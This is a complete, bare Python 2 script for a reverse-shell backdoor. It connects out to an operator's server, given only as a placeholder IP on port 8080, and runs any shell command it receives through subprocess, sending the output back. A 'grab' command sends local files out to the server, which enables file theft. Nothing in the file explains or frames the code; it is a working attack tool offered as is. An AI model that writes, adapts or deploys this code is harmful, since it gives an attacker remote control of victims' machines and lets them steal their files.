import socket
import subprocess
import os

def transfer(s, path):
	if os.path.exists(path):
		f = open(path, "r")
		packet = f.read(1024) #Cut the file to 1KB packets

		while packet != "":
			s.send(packet)
			packet = f.read(1024)

		s.send("DONE")
		f.close()
	else: #The file doesn't exist
		s.send("Unable to find out the file")

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("IP Address", 8080)) #Needs the IP of the server and the port the server is listening

	while True:
		command = s.recv(1014)

		if "terminate" in command:
			s.close()
			break
		elif "grab" in command: #This is for file transfering
			grab, path = command.split("*")

			try:
				transfer(s, path)
			except Exception,e:
				s.send(str(e))
				pass
		else:
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) #Pass the command and save the result in CMD
			s.send(CMD.stdout.read())
			s.send(CMD.stderr.read())

def main():
	connect()

main()

